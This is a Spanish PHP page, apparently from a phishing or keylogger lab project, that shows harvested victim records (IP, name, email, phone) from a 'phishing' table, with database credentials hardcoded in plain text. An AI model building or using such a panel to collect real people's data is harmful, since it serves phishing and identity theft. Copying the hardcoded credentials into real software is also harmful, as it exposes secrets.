<?php
    ob_start(); // Habilita el buffer de salida
    session_start();
    
    $servername = "mysql-db";
    $username = "sea";
    $password = "proyectose@";
    $database = "bd_keyloggers";
    
    // Conexión
    $conn = mysqli_connect($servername, $username, $password, $database);
    if (!$conn) {
        die("Conexion fallida: " . mysqli_connect_error());
    }
?>
<!DOCTYPE html>
<html lang="es"> 
    <head>
        <meta charset="utf-8">
        <title>Bases de datos - Phishing</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="https://fonts.googleapis.com/css?family=Nunito&display=swap" rel="stylesheet"> 
        <link href="https://fonts.googleapis.com/css?family=Overpass&display=swap" rel="stylesheet">


        <!--<script src="script_listado.js" defer></script>-->
        
            <!-- Link hacia el archivo de estilos css -->
            <link rel="stylesheet" href="../css/basesdedatos.css">

            <!-- Link favicon -->
            <link rel="shortcut icon" href="../img/logo.png" type="image/x-icon">

            <!-- Link para que funcionen los FA FA -->
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    </head>

    <body class="fondo">
        <!--CABECERA-->
        <div id="header">
            <div class="logo">
                <img src="../img/logo.png" alt="COACHING SL">
            </div>
            <nav>
                <ul>
                    <?php
                        echo "<li><a href='opciones.php'><i class='fa fa-home'></i> <span data-translate='inicio'>Inicio</span></a></li>";
                        echo "<li><a href='phishing.php'><i class='fa-solid fa-fish'></i> <span data-translate='phishing'>Phishing</span></a></li>";
                        echo '<br>';
                    ?>
                </ul>
            </nav>
        </div>
        
        <main>
        <!-- Listado de especialistas -->
        <div class="listado-citas">
            <h1>Resultados de la base de datos</h1>
          <!--  <div class="underline"></div> -->
            <div id="contenedor-listado">
                <?php

                /* Sentencia preparada para evitar inyecciones SQL */
                $sql_todo = "SELECT * FROM phishing";
                $stmt = $conn->prepare($sql_todo);
                $stmt->execute();
                $result = $stmt->get_result();

                if (mysqli_num_rows($result) > 0) {
                    $Final = 0;
                    $row = mysqli_fetch_assoc($result);

                    while ($row) { 
                        
                        $IP_Anterior = $row['ip'];
                        $ul_id = 'info_' . $Final; // ID único para el <ul>

                        echo '<div class="cita-contenedor">';
                            echo '<div class="underline"></div>';
                            echo '<h5>IP: ' . htmlspecialchars($row['ip'], ENT_QUOTES, 'UTF-8') . '</h5>';
                            echo '<div class="icono-separador">';
                                echo '<i class="fa fa-user" aria-hidden="true"></i>';
                            echo '</div>';

                            // Botón para mostrar/ocultar la información
                            echo '<button onclick="toggleUl(\''.$ul_id.'\', this)" class="boton-toggle">Mostrar información</button>';

                            echo '<ul id="'.$ul_id.'" style="display: none;">'; // Ocultar solo el <ul>
                                $i = 1;
                                while ($row && $IP_Anterior == $row['ip']) {
                                    echo'<br>';
                                    echo '<div class="cajita">';
                                        echo '<li>Realizado el día: ' . htmlspecialchars($row['fecha'], ENT_QUOTES, 'UTF-8') . '</li>';
                                        echo '<p>Nombre y apellido: ' . htmlspecialchars($row['nombre_apellidos'], ENT_QUOTES, 'UTF-8') . '</p>';
                                        echo '<p>Correo: ' . htmlspecialchars($row['email'], ENT_QUOTES, 'UTF-8') . '</p>';
                                        echo '<p>Teléfono: ' . htmlspecialchars($row['telefono'], ENT_QUOTES, 'UTF-8') . '</p>';
                                    echo '</div>';     
                                    $Final++;
                                    $i++;
                                    $row = mysqli_fetch_assoc($result);
                                }
                            echo '</ul>';
                        echo '</div>';
                    }

                } else {
                    echo '<p>No hay ningún registro en la base de datos.</p>';
                }
                ?>
            </div>
        </div>
 
        <script>
        function toggleUl(id, boton) {
            const ul = document.getElementById(id);
            const isHidden = ul.style.display === "none";

            ul.style.display = isHidden ? "block" : "none";
            boton.textContent = isHidden ? "Ocultar información" : "Mostrar información";
        }
        </script>
 </main>
        <!-- PIE DE PAGINA -->
        <footer>
        Todos los derechos reservados | Keylogger SL Copyright © 2025
        </footer>


    </body>
</html>
